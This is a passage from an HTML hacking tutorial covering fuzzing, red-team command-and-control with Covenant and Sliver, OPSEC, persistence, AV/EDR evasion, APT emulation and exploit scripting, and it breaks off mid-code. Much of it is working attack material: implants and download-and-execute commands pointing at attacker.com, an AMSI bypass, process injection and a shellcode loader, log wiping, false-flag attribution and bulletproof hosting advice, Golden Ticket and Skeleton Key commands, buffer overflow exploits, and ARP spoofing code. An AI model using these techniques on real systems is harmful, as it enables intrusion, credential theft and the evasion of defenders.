afl-fuzz -i input -o output -M fuzzer1 -- ./vuln_parse @@
afl-fuzz -i input -o output -S fuzzer2 -- ./vuln_parse @@
afl-fuzz -i input -o output -S fuzzer3 -- ./vuln_parse @@

# Dictionary (known keywords):
cat > dict.txt << 'EOF'
"GET "
"POST "
"<html>"
"<?xml"
EOF

afl-fuzz -i input -o output -x dict.txt -- ./vuln_parse @@

# Persistent mode (faster):
# Fuzz function repeatedly without restarting process

# Custom mutator:
# Write Python script to generate specialized inputs

# AFL found:
# • Heartbleed (OpenSSL)
# • Bash shellshock
# • 100+ vulnerabilities in major projects</div>

            <h4>Other Fuzzing Tools</h4>

            <div class="code"># libFuzzer (LLVM built-in):

# Compile target with libFuzzer:
clang -fsanitize=fuzzer,address vuln_parse.c -o vuln_parse_fuzz

# Run:
./vuln_parse_fuzz

# Automatically starts fuzzing!

# Honggfuzz (Google):
git clone https://github.com/google/honggfuzz
cd honggfuzz
make

# Fuzz:
honggfuzz -i input -o output -- ./vuln_parse ___FILE___

# WinAFL (Windows AFL):
# For fuzzing Windows binaries

# Syzkaller (kernel fuzzing):
# Specifically for fuzzing Linux kernel

# Peach Fuzzer (protocol fuzzing):
# For network protocols, file formats

# Boofuzz (network protocol fuzzing):
pip install boofuzz

# Python script:
from boofuzz import *

session = Session(target=Target(connection=SocketConnection("192.168.1.100", 80)))

s_initialize("HTTP GET")
s_string("GET", fuzzable=False)
s_delim(" ", fuzzable=False)
s_string("/", fuzzable=True)  # Fuzz URI
s_delim(" ", fuzzable=False)
s_string("HTTP/1.1\r\n", fuzzable=False)
s_string("Host: target.com\r\n\r\n")

session.connect(s_get("HTTP GET"))
session.fuzz()

# Generates thousands of malformed HTTP requests
# Monitors for crashes, hangs, errors</div>

            <div class="metaphor-box">
                <h4>🎉 You're an Advanced Exploitation Expert!</h4>
                <p>You've conquered:<br><br>
                ✅ <strong>ROP Chains:</strong> Bypassing DEP/NX with gadget chaining, pop/ret magic, syscall invocation<br>
                ✅ <strong>Heap Exploitation:</strong> Use-after-free, double-free, heap overflow, heap feng shui<br>
                ✅ <strong>Kernel Exploits:</strong> Privilege escalation, cred struct overwrite, DirtyPipe<br>
                ✅ <strong>Fuzzing:</strong> AFL, libFuzzer, Honggfuzz, crash triage, 0-day discovery<br><br>
                <strong>Modern exploit development workflow:</strong><br>
                1. <strong>Fuzzing:</strong> Find crash with AFL/libFuzzer<br>
                2. <strong>Triage:</strong> Determine vulnerability type (overflow, UAF, etc.)<br>
                3. <strong>Analysis:</strong> Reverse engineer with Ghidra, understand constraints<br>
                4. <strong>Exploitation:</strong> Develop exploit (ROP chains, heap techniques)<br>
                5. <strong>Bypass protections:</strong> Defeat ASLR (leak addresses), PIE, canaries<br>
                6. <strong>Reliability:</strong> Make exploit work 100% of the time<br>
                7. <strong>Weaponization:</strong> Package as Metasploit module or standalone tool<br><br>
                <strong>Real CVEs using these techniques:</strong><br>
                • <strong>CVE-2021-3156 (Baron Samedit):</strong> Sudo heap overflow → root<br>
                • <strong>CVE-2022-0847 (DirtyPipe):</strong> Kernel pipe bug → arbitrary file write<br>
                • <strong>CVE-2021-22555 (Netfilter):</strong> Kernel heap overflow → root<br>
                • <strong>CVE-2014-0160 (Heartbleed):</strong> OpenSSL heap overflow → memory leak<br><br>
                <strong>Learning resources:</strong><br>
                • pwn.college (free ASU course)<br>
                • exploit.education (practice challenges)<br>
                • CTF time (competitions)<br>
                • Project Zero blog (Google's bug hunters)<br>
                • Phrack magazine (classic exploits)<br><br>
                You now understand how modern exploits bypass ALL protections. Every CVE in the news makes sense now! 🚀💥</p>
            </div>
        </section>

        <!-- SECTION 8: Red Team Operations & Tradecraft -->
        <section id="red-team" class="section">
            <h2 class="section-title">Red Team Operations & Tradecraft</h2>
            <p class="section-intro">Red teaming isn't just hacking—it's adversary emulation. Blue teams (defenders) know you're coming. They have EDR, SIEM, threat hunting teams, and incident responders. Your job: bypass detection, maintain persistence, move laterally, exfiltrate data, and stay invisible. This requires OPSEC (operational security), living off the land, custom C2 infrastructure, and understanding how defenders think. This section covers Covenant C2, Sliver C2, OPSEC principles, persistence techniques, AV/EDR evasion, and APT emulation. By the end, you'll think like a nation-state hacker!</p>

            <div class="metaphor-box">
                <h4>💡 Red Team = Playing Hide & Seek with $100M in Prizes</h4>
                <p><strong>Penetration testing:</strong> "Can you break in?" → Yes/No answer<br>
                <strong>Red teaming:</strong> "Can you break in WITHOUT getting caught?" → Stealth is the goal!<br><br>
                <strong>Pentester mindset:</strong><br>
                • Find vuln → Exploit → Report → Done<br>
                • Speed matters<br>
                • Detection doesn't matter<br><br>
                <strong>Red teamer mindset:</strong><br>
                • Find vuln → Exploit stealthily → Establish persistence → Evade detection → Move laterally → Exfiltrate → Cover tracks → Report → Done<br>
                • Stealth matters MORE than speed<br>
                • Getting caught = mission failure<br><br>
                <strong>Real red team objectives:</strong><br>
                • Steal CEO's emails without alerting SOC<br>
                • Plant backdoor that survives incident response<br>
                • Exfiltrate 10GB database over 3 months (slow & steady)<br>
                • Compromise domain admin while looking like normal IT activity<br><br>
                Red teamers emulate APTs (Advanced Persistent Threats). You're role-playing as nation-state hackers! 🕵️‍♂️🎭</p>
            </div>

            <h3>Part 1: Command & Control (C2) Frameworks</h3>

            <h4>What is C2?</h4>

            <div class="info-box">
                <h4>Command & Control Architecture</h4>
                <p><strong>Components:</strong><br>
                • <strong>Team Server:</strong> Attacker's control panel (your machine)<br>
                • <strong>Listener:</strong> Waits for connections from victims<br>
                • <strong>Payload/Implant:</strong> Runs on victim machine (beacon, agent, grunt)<br>
                • <strong>Communication Channel:</strong> HTTP, HTTPS, DNS, SMB pipes, etc.<br><br>
                <strong>C2 workflow:</strong><br>
                1. Generate payload (malicious exe/dll/script)<br>
                2. Deliver payload to victim (phishing, exploit, USB drop)<br>
                3. Victim executes payload<br>
                4. Payload "calls home" to listener<br>
                5. You get session on victim machine<br>
                6. Execute commands, steal files, spread to other machines<br><br>
                <strong>Why not just reverse shell?</strong><br>
                • Reverse shell = Detected instantly by EDR<br>
                • C2 = Encrypted, obfuscated, looks like normal traffic<br>
                • C2 supports sleep/jitter (callback every 5 minutes, not constantly)<br>
                • C2 has built-in AV evasion, credential dumping, lateral movement</p>
            </div>

            <h4>Covenant C2 Framework</h4>

            <div class="code"># Covenant = .NET C2 framework (targets Windows)
# Web-based interface, open-source, active development

# Install Covenant:
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
docker build -t covenant .
docker run -it -p 7443:7443 -p 80:80 -p 443:443 covenant

# Or without Docker:
dotnet build
dotnet run

# Access web interface:
# https://localhost:7443

# First-time setup:
# 1. Create admin user
# 2. Set up listener

# Create Listener:
# Listeners → Create → HTTP Listener
#   Name: HTTPListener
#   BindAddress: 0.0.0.0
#   BindPort: 80
#   ConnectPort: 80
#   ConnectAddress: [Your IP or domain]
#   UseSSL: No (for testing; use Yes in real ops!)
# Click Create

# Generate Grunt (payload):
# Launchers → Binary
#   Listener: HTTPListener
#   DotNetVersion: Net40 (compatible with old Windows)
#   Delay: 5 seconds (callback interval)
#   JitterPercent: 30 (±30% randomness)
#   ConnectAttempts: 5000
#   KillDate: (leave blank or set expiration)
# Click Generate → Download

# Transfer GruntHTTP.exe to victim machine
# Execute it:
# (on victim) ./GruntHTTP.exe

# Back in Covenant web interface:
# Grunts → New session appears!
#   Name: DESKTOP-ABC123\User
#   Integrity: Medium
#   LastCheckIn: 2 seconds ago

# Interact with Grunt:
# Click grunt → Task tab

# Basic commands:
Task> Shell whoami
# Output: DESKTOP-ABC123\victim

Task> Shell ipconfig
# Output: [network config]

# Built-in tasks:
Task> Mimikatz
# Dumps credentials from memory!
# Output:
#   Username: administrator
#   NTLM: 8846f7eaee8fb117ad06bdd830b7586c

Task> PowerShellImport
# Load custom PowerShell scripts

Task> Assembly
# Execute .NET assembly in memory (no disk write!)

# Example: Execute Rubeus (Kerberos toolkit)
Task> Assembly Rubeus.exe dump /service:krbtgt
# Dumps Kerberos tickets

# Lateral movement:
Task> ShellCommand net user hacker Password123! /add /domain
# Creates domain user

Task> WMICommand \\10.0.0.50 "notepad.exe"
# Executes command on remote machine via WMI

# File operations:
Task> Download C:\Users\victim\Documents\passwords.txt
# Downloads file to team server

Task> Upload /root/tools.zip C:\ProgramData\tools.zip
# Uploads file to victim

# Persistence:
Task> Persist Registry
# Adds registry key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run

Task> Persist ScheduledTask
# Creates scheduled task for persistence</div>

            <h4>Sliver C2 Framework</h4>

            <div class="code"># Sliver = Modern Go-based C2, supports Windows/Linux/macOS
# Command-line interface, encrypted by default

# Install Sliver:
curl https://sliver.sh/install | sudo bash

# Or manual install:
git clone https://github.com/BishopFox/sliver.git
cd sliver
make

# Start Sliver server:
sliver-server

# Sliver console:
sliver > help

# Create implant:
sliver > generate --http https://attacker.com:443 --os windows --arch amd64 --save /tmp/beacon.exe

# Options:
#   --http: C2 server URL
#   --os: Target OS (windows/linux/darwin)
#   --arch: Architecture (amd64/386/arm64)
#   --format: Output format (exe/shellcode/service-exe/shared-lib)
#   --save: Save path

# Output:
# [*] Generating new windows/amd64 implant binary
# [*] Symbol obfuscation is enabled
# [*] Build completed in 3s
# [*] Implant saved to /tmp/beacon.exe

# Start listener:
sliver > http --domain attacker.com --lport 443

# [*] Starting HTTP :443 listener ...

# Execute beacon on victim machine
# Session appears:

sliver > sessions

# ID  Name       Username     Operating System  Last Check-in
# 1   LOUD_PUMA  victim\user  windows/amd64     2s ago

# Interact with session:
sliver > use 1

sliver (LOUD_PUMA) > whoami
# victim\user

sliver (LOUD_PUMA) > ps
# [shows running processes]

sliver (LOUD_PUMA) > getprivs
# [shows current privileges]

# Evasion features:
sliver (LOUD_PUMA) > migrate 1234
# Migrates implant to different process (PID 1234)

sliver (LOUD_PUMA) > execute-assembly /root/Rubeus.exe dump
# Executes .NET assembly in memory

sliver (LOUD_PUMA) > procdump -n lsass.exe -s /tmp/lsass.dmp
# Dumps LSASS process memory (for offline credential extraction)

# Pivoting:
sliver (LOUD_PUMA) > portfwd add --remote 10.0.0.5:445
# Forwards local port to remote SMB service

sliver (LOUD_PUMA) > socks5 start
# Starts SOCKS5 proxy for pivoting through victim

# Use with proxychains:
# proxychains nmap 10.0.0.0/24

# Advanced features:
sliver > armory
# [Package manager for extensions]

sliver > armory install rubeus
sliver > armory install seatbelt
sliver > armory install sharphound

# These integrate directly into Sliver!</div>

            <h3>Part 2: OPSEC (Operational Security)</h3>

            <div class="warning-box">
                <h4>⚠️ OPSEC Mistakes = Getting Caught</h4>
                <p><strong>Real-world OPSEC failures that got hackers caught:</strong><br><br>
                • <strong>Reusing infrastructure:</strong> APT used same IP for 5 years → Traced<br>
                • <strong>Forgot VPN once:</strong> Connected from home IP → Arrested<br>
                • <strong>Domain registration:</strong> Used real email → Identified<br>
                • <strong>Reusing usernames:</strong> "xXHackerXx" on GitHub, forum, malware → Doxxed<br>
                • <strong>Malware metadata:</strong> Compiler username in PE header → Exposed<br>
                • <strong>Bitcoin transactions:</strong> Cashed out to exchange with KYC → Caught<br><br>
                OPSEC isn't optional. One mistake ruins the entire operation! 🚨</p>
            </div>

            <div class="code"># OPSEC Principles:

# 1. Infrastructure Isolation
# ❌ Don't:
# • Use your home IP
# • Use personal VPS/cloud account
# • Reuse infrastructure across operations

# ✅ Do:
# • Use VPS paid with cryptocurrency
# • Route through multiple layers (VPN → VPS → Target)
# • Use Bulletproof Hosting (providers that ignore abuse complaints)
# • Burn infrastructure after each operation

# Setup:
# [Your PC] → [VPN] → [VPS 1] → [VPS 2] → [Target]
#             Privacy   Pivot     Attack Server

# 2. Domain Fronting
# Hide C2 traffic behind legitimate CDN domains

# Technique:
# • SNI says: "cloudfront.com"
# • Host header says: "evil-c2.com"
# • CloudFront sees cloudfront.com, forwards to evil-c2.com
# • Defender sees: "User connected to cloudfront.com" → Looks normal!

# Covenant config:
sliver > generate --http https://cloudfront.net --http-host evil-c2.com

# 3. Traffic Obfuscation
# Make C2 traffic look like normal web traffic

# Covenant HTTP profile:
# GET requests look like:
# GET /search?q=aGVsbG8= HTTP/1.1
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...
# Cookie: session=eyJjb21tYW5kIjoiY2QgQzpcXCJ9

# Commands are base64-encoded in URLs/cookies
# Responses look like JavaScript/images

# 4. Timestomping
# Modify file creation/modification times

# PowerShell:
$(Get-Item file.exe).creationtime = "01/01/2020 00:00:00"
$(Get-Item file.exe).lastaccesstime = "01/01/2020 00:00:00"
$(Get-Item file.exe).lastwritetime = "01/01/2020 00:00:00"

# Now file appears to be from 2020!

# 5. Clean Malware Metadata
# Remove identifying info from payloads

# Check PE metadata:
exiftool malware.exe

# Output:
# File Name: malware.exe
# Author: John Doe  ← BAD!
# Company: MyCompany ← BAD!
# Internal Name: beacon.exe
# Original File Name: beacon.exe
# Product Name: Covenant
# Comments: Built on DESKTOP-ABC123  ← BAD!

# Strip metadata:
exiftool -all= malware.exe

# Verify:
exiftool malware.exe
# (Should show minimal info)

# 6. Log Cleaning
# Remove traces after operation

# Windows:
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Or selective deletion:
wevtutil qe Security "/q:*[System[(EventID=4624)]]" /f:text | findstr "victim"
wevtutil qe Security "/q:*[System[(EventID=4624) and TimeCreated[@SystemTime>='2026-01-08T10:00:00']]]" /c:1 /rd:true

# Linux:
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
history -c

# 7. Attribution Obfuscation
# Make it look like different threat actor

# Tactics:
# • Use Chinese-language strings (if you're Russian)
# • Use malware associated with APT28 (if you're not APT28)
# • Set timezone to false location
# • Mimic TTPs (Tactics, Techniques, Procedures) of other groups</div>

            <h3>Part 3: Persistence Techniques</h3>

            <div class="code"># Persistence = Surviving reboots, credential changes, detection

# 1. Registry Run Keys (Classic)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\ProgramData\update.exe"

# Runs update.exe every time user logs in
# Detection: Easy (commonly monitored)

# 2. Scheduled Tasks
schtasks /create /tn "GoogleUpdateService" /tr "C:\ProgramData\update.exe" /sc onlogon /ru SYSTEM

# More stealthy than registry
# /ru SYSTEM = Runs as SYSTEM (high privileges!)

# 3. WMI Event Subscription
# Most stealthy, rarely monitored

# PowerShell:
$FilterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = "PersistenceFilter"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    QueryLanguage = "WQL"
}
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = "PersistenceConsumer"
    CommandLineTemplate = "C:\ProgramData\update.exe"
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $ConsumerArgs

$FilterToConsumerArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $FilterToConsumerArgs

# This executes update.exe every 60 seconds!
# Detection: Very difficult (deep in WMI)

# 4. Service Creation
sc create "WindowsDefenderUpdate" binPath= "C:\ProgramData\update.exe" start= auto
sc start WindowsDefenderUpdate

# Runs as service, survives reboots
# Tip: Name it like legitimate Windows service

# 5. DLL Hijacking
# Place malicious DLL in application folder
# Application loads your DLL instead of legitimate one

# Example: Place evil version.dll in C:\Program Files\Vulnerable App\
# When app.exe runs → loads version.dll → backdoor activated!

# 6. Startup Folder
copy update.exe "C:\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# Simple but effective

# 7. COM Hijacking
# Modify registry to hijack COM objects

reg add "HKCU\Software\Classes\CLSID\{GUID}\InProcServer32" /ve /t REG_SZ /d "C:\evil.dll"

# When legitimate program loads COM object → loads your DLL

# 8. Golden Ticket (Domain Persistence)
# Forge Kerberos ticket for domain admin

# Requires: krbtgt NTLM hash (get via DCSync)

mimikatz # kerberos::golden /user:Administrator /domain:company.local /sid:S-1-5-21-... /krbtgt:deadbeef... /id:500 /ptt

# Creates ticket valid for 10 years!
# Survives password resets!

# 9. Skeleton Key (Domain Persistence)
# Install backdoor password on Domain Controller

mimikatz # privilege::debug
mimikatz # misc::skeleton

# Now any domain user can login with password: "mimikatz"
# Their real password still works too!

# 10. Implant in Legitimate Service
# Inject into long-running Windows service

# Example: Inject into svchost.exe
# Detection: Difficult (looks like normal svchost)</div>

            <h3>Part 4: AV/EDR Evasion</h3>

            <div class="code"># Modern defenses:
# • Antivirus (signature-based)
# • EDR (Endpoint Detection & Response - behavior-based)
# • AMSI (AntiMalware Scan Interface - scans PowerShell/scripts)

# Evasion techniques:

# 1. Obfuscation
# Modify payload so signatures don't match

# Tool: Veil Framework
git clone https://github.com/Veil-Framework/Veil.git
cd Veil
./Veil.py

# Generate obfuscated payload:
use Evasion
use python/meterpreter/rev_tcp
set LHOST 10.0.0.1
set LPORT 4444
generate

# Creates .exe that bypasses AV

# 2. AMSI Bypass
# Disable AMSI before running PowerShell payloads

# PowerShell one-liner:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Or obfuscated version:
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# AMSI now disabled! PowerShell payloads won't be scanned

# 3. In-Memory Execution
# Never touch disk (no files for AV to scan)

# Covenant: execute-assembly (runs .NET in memory)
# Sliver: execute-shellcode (injects shellcode into process)

# PowerShell:
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')

# Downloads and executes in memory!

# 4. Process Injection
# Inject into legitimate process

# C# example:
// Open target process
Process target = Process.GetProcessesByName("notepad")[0];
IntPtr procHandle = OpenProcess(0x1F0FFF, false, target.Id);

// Allocate memory in target
IntPtr addr = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode.Length, 0x3000, 0x40);

// Write shellcode
WriteProcessMemory(procHandle, addr, shellcode, shellcode.Length, out _);

// Create thread
CreateRemoteThread(procHandle, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

# Shellcode now running inside notepad.exe!
# EDR sees: notepad.exe (looks normal)

# 5. Sleep Obfuscation
# EDR scans sleeping processes
# Solution: Encrypt beacon while sleeping

# Sliver feature:
sliver (BEACON) > sleep-obfuscation

# Beacon encrypts itself before sleep
# Decrypts on wakeup
# EDR memory scan finds encrypted gibberish!

# 6. Unhooking
# EDR "hooks" Windows APIs to monitor calls
# Remove hooks before executing malicious code

# C# example (unhook NTDLL):
// Read fresh ntdll.dll from disk
byte[] ntdllBytes = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");

// Overwrite hooked ntdll in memory
// Now EDR can't monitor our syscalls!

# 7. Direct Syscalls
# Bypass EDR hooks entirely by calling kernel directly

# Example (x64 assembly for NtAllocateVirtualMemory):
mov r10, rcx
mov eax, 0x18  # Syscall number
syscall
ret

# No userland API calls → EDR can't see it!

# 8. Living Off The Land (LOLBins)
# Use legitimate Windows tools for malicious purposes

# Download file without PowerShell:
certutil -urlcache -split -f http://attacker.com/payload.exe C:\ProgramData\payload.exe

# Or:
bitsadmin /transfer myDownload http://attacker.com/payload.exe C:\ProgramData\payload.exe

# Execute payload:
rundll32.exe C:\ProgramData\payload.dll,EntryPoint

# EDR sees: "certutil.exe ran" (normal Windows tool!)

# 9. Shellcode Loaders
# Custom loader that executes shellcode

# Golang loader (cross-platform, hard to reverse):
package main
import (
    "syscall"
    "unsafe"
)

func main() {
    shellcode := []byte{0x90, 0x90, ...}  // Your shellcode
    
    addr, _, _ := syscall.Syscall(syscall.VirtualAlloc, 4,
        0, uintptr(len(shellcode)), 0x3000, 0x40)
    
    syscall.Syscall(syscall.RtlCopyMemory, 3,
        addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
    
    syscall.Syscall(addr, 0, 0, 0, 0)
}

# Compile:
GOOS=windows go build -ldflags="-s -w" loader.go

# No suspicious imports, custom loader, harder to detect!</div>

            <h3>Part 5: APT Emulation</h3>

            <div class="code"># APT = Advanced Persistent Threat (nation-state hackers)

# Framework: MITRE ATT&CK
# https://attack.mitre.org/

# APT28 (Fancy Bear, Russia) TTPs:

# Initial Access:
# - Spearphishing (T1566)
# - Watering hole attacks (T1189)

# Execution:
# - PowerShell (T1059.001)
# - WMI (T1047)

# Persistence:
# - Registry Run Keys (T1547.001)
# - Scheduled Tasks (T1053.005)

# Privilege Escalation:
# - Bypass UAC (T1548.002)
# - Exploit vulnerability (T1068)

# Defense Evasion:
# - Obfuscated Files (T1027)
# - Process Injection (T1055)

# Credential Access:
# - LSASS Memory Dump (T1003.001)
# - Credential from Registry (T1003.002)

# Discovery:
# - Network Service Scanning (T1046)
# - Domain Trust Discovery (T1482)

# Lateral Movement:
# - Remote Desktop Protocol (T1021.001)
# - Windows Admin Shares (T1021.002)

# Collection:
# - Archive Collected Data (T1560)
# - Email Collection (T1114)

# Exfiltration:
# - Exfiltration Over C2 Channel (T1041)

# Emulating APT28 red team exercise:

# Day 1: Initial Access
# Send spearphishing email with malicious Word doc
# (Contains macro that downloads Covenant beacon)

# Day 2: Establish Foothold
# Beacon calls home
# Execute post-exploitation:
#   - Dump credentials (Mimikatz)
#   - Establish persistence (WMI subscription)
#   - Enumerate domain (PowerView)

# Day 3: Lateral Movement
# Found domain admin credentials
# Move to Domain Controller via WMI:
wmic /node:DC01 /user:admin /password:pass process call create "rundll32.exe C:\ProgramData\beacon.dll,Start"

# Day 4: Domain Dominance
# Dump krbtgt hash (DCSync)
# Create Golden Ticket
# Now persistent access for years!

# Day 5: Exfiltration
# Exfiltrate data slowly (100MB/day)
# Use DNS tunneling to avoid detection
# Encrypt data before exfil

# Day 6: Cover Tracks
# Clear logs
# Remove obvious persistence (keep WMI subscription)
# Document findings for report

# Tools for APT emulation:

# Atomic Red Team (automated TTPs):
git clone https://github.com/redcanaryco/atomic-red-team.git
cd atomic-red-team
Invoke-AtomicTest T1003.001  # LSASS dump

# Caldera (autonomous red team):
git clone https://github.com/mitre/caldera.git
cd caldera
python3 server.py --insecure

# Access: http://localhost:8888
# Creates automated adversary that emulates APT campaigns!

# Mythic (multi-platform C2):
# Supports Windows, Linux, macOS
# Plugin-based architecture
# Customizable profiles for different APTs</div>

            <div class="metaphor-box">
                <h4>🎉 You're a Red Team Operator!</h4>
                <p>You've mastered:<br><br>
                ✅ <strong>C2 Frameworks:</strong> Covenant, Sliver, listener setup, payload generation, session management<br>
                ✅ <strong>OPSEC:</strong> Infrastructure isolation, domain fronting, traffic obfuscation, attribution evasion<br>
                ✅ <strong>Persistence:</strong> Registry keys, scheduled tasks, WMI subscriptions, Golden Tickets, Skeleton Key<br>
                ✅ <strong>Evasion:</strong> AMSI bypass, in-memory execution, process injection, unhooking, direct syscalls<br>
                ✅ <strong>APT Emulation:</strong> MITRE ATT&CK, real-world TTPs, phased operations<br><br>
                <strong>Red Team Engagement Phases:</strong><br>
                1. <strong>Planning:</strong> Define objectives, rules of engagement, OPSEC plan<br>
                2. <strong>Initial Access:</strong> Phishing, exploit, physical access<br>
                3. <strong>Establish Foothold:</strong> C2 callback, persistence, credential dumping<br>
                4. <strong>Escalate Privileges:</strong> Local admin → Domain admin<br>
                5. <strong>Lateral Movement:</strong> Spread to high-value targets<br>
                6. <strong>Achieve Objectives:</strong> Exfiltrate data, plant flags, test detection<br>
                7. <strong>Cover Tracks:</strong> Remove obvious indicators, keep subtle backdoors<br>
                8. <strong>Report:</strong> Document TTPs used, detection gaps, remediation advice<br><br>
                <strong>Career paths:</strong><br>
                • Red Team Operator (offensive security)<br>
                • Purple Team (red team + blue team collaboration)<br>
                • Threat Intelligence (understanding APT TTPs)<br>
                • Security Researcher (finding new evasion techniques)<br><br>
                You now think like a nation-state hacker. Use this power responsibly! 🎭🚀</p>
            </div>
        </section>

        <!-- SECTION 9: Custom Tool Development -->
        <section id="custom-tools" class="section">
            <h2 class="section-title">Custom Tool Development</h2>
            <p class="section-intro">Off-the-shelf tools are great, but they have limitations: detected by AV, lack specific features you need, or don't fit your workflow. The ultimate hacker skill: building your own tools! This section teaches Python exploit development, Scapy packet manipulation, custom scanner creation, automation scripts, and tool integration. You'll learn to build port scanners, vulnerability scanners, exploit frameworks, credential harvesters, and anything else you can imagine. By the end, you'll never be limited by existing tools again!</p>

            <div class="metaphor-box">
                <h4>💡 Custom Tools = Your Hacking Superpower</h4>
                <p><strong>Why build custom tools?</strong><br><br>
                • <strong>Stealth:</strong> AV doesn't have signatures for YOUR code<br>
                • <strong>Flexibility:</strong> Add features tailored to your target<br>
                • <strong>Speed:</strong> Automate repetitive tasks<br>
                • <strong>Learning:</strong> Understand tools by rebuilding them<br>
                • <strong>Integration:</strong> Connect tools that don't normally work together<br><br>
                <strong>Real-world examples:</strong><br>
                • Metasploit started as HD Moore's custom scanner<br>
                • Burp Suite started as PortSwigger's custom proxy<br>
                • Nmap started as Fyodor's custom port scanner<br><br>
                Every major tool started as someone's custom script! 🚀</p>
            </div>

            <h3>Part 1: Python Exploit Development</h3>

            <div class="code"># Python is THE language for exploit development:
# • Easy to learn, fast to prototype<br>
# • Rich library ecosystem (sockets, HTTP, crypto)<br>
# • Platform-independent<br>
# • Integration with other tools

# Basic exploit template:

from pwn import *  # pwntools library

# Target configuration
host = '192.168.1.100'
port = 9999

# Connect to target
r = remote(host, port)

# Receive banner
banner = r.recvuntil(b'>')
log.info(f"Banner: {banner}")

# Build exploit payload
offset = 112  # Buffer overflow offset
eip_value = p32(0x41414141)  # Return address
shellcode = asm(shellcraft.linux.sh())  # Generate shellcode

payload = b'A' * offset
payload += eip_value
payload += shellcode

# Send exploit
log.info("Sending payload...")
r.send(payload)

# Interact with shell
r.interactive()

# Example: Buffer overflow exploit for vulnerable server

from socket import *
from struct import pack

target_ip = '192.168.1.100'
target_port = 9999

# Bad characters to avoid (nullbytes, newlines, etc.)
bad_chars = b'\x00\x0a\x0d'

# msfvenom generated shellcode (reverse shell)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

# NOP sled (\x90 = NOP instruction)
nops = b'\x90' * 16

# Return address (JMP ESP address from binary)
ret_addr = pack('<I', 0x625011af)  # Little-endian

# Build payload
buffer_size = 524
padding = buffer_size - len(shellcode) - len(nops)

exploit = nops + shellcode
exploit += b'A' * padding
exploit += ret_addr

# Send exploit
sock = socket(AF_INET, SOCK_STREAM)
sock.connect((target_ip, target_port))
sock.send(exploit)
sock.close()

print("[+] Exploit sent! Check listener for shell.")

# Advanced: Format string exploit

# Vulnerable code:
# printf(user_input);  // No format specifier!

# Exploitation:
payload = b"%x." * 20  # Leak stack values
# Or:
payload = b"%s%s%s%s"  # Crash (read from invalid addresses)
# Or:
payload = b"%n"  # Write to memory!

# Example format string exploit:
target_addr = 0x08049000  # GOT entry to overwrite
shellcode_addr = 0xbffff000

# Write shellcode_addr to target_addr:
payload = p32(target_addr)
payload += b"%" + str(shellcode_addr - 4).encode() + b"x"
payload += b"%n"

# This overwrites GOT entry with our shellcode address!

# Heap overflow exploit:

# Vulnerable code:
# char *buf1 = malloc(100);
# char *buf2 = malloc(100);
# strcpy(buf1, user_input);  // No bounds check!

# Exploitation (unlink attack):
# Overwrite heap metadata to write shellcode address to GOT

payload = b'A' * 100  # Fill first chunk
payload += p32(0xffffffff)  # Size field (prevent coalescing)
payload += p32(0x0804a000)  # FD (forward pointer)
payload += p32(0x0804a004)  # BK (backward pointer)
# When free() is called, FD->BK = BK and BK->FD = FD
# This writes to arbitrary memory!</div>

            <h3>Part 2: Scapy - Packet Manipulation Master</h3>

            <div class="code"># Scapy = Python library for network packet manipulation

from scapy.all import *

# Install:
# pip3 install scapy

# Basic packet creation:
pkt = IP(dst="192.168.1.1")/ICMP()
send(pkt)

# Or with reply:
reply = sr1(pkt)
print(reply.show())

# TCP SYN scan (like nmap):

def syn_scan(target, ports):
    open_ports = []
    for port in ports:
        pkt = IP(dst=target)/TCP(dport=port, flags='S')
        reply = sr1(pkt, timeout=1, verbose=0)
        
        if reply and reply.haslayer(TCP):
            if reply[TCP].flags == 'SA':  # SYN-ACK = open
                open_ports.append(port)
                # Send RST to close connection cleanly
                rst = IP(dst=target)/TCP(dport=port, flags='R')
                send(rst, verbose=0)
    
    return open_ports

result = syn_scan('192.168.1.100', range(1, 1025))
print(f"Open ports: {result}")

# ARP spoofing (MITM attack):

def arp_spoof(target_ip, gateway_ip):
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    
    # Tell target: "I am the gateway"
    arp_target = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                     psrc=gateway_ip)
    
    # Tell gateway: "I am the target"
    arp_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                      psrc=target_ip)
    
    while True:
        send(arp_target, verbose=0)
        send(arp_gateway, verbose=0)
        time.sleep(2)

# Usage:
# arp_spoof('192.168.1.10', '192.168.1.1')
# Now all traffic from .10 routes through you!

# DNS spoofing:

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR):  # DNS query
        qname = pkt[DNSQR].qname.decode()
        
        if 'bank.com' in qname:
            # Forge DNS response
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                         UDP(dport=pkt[UDP].sport, sport=53)/\
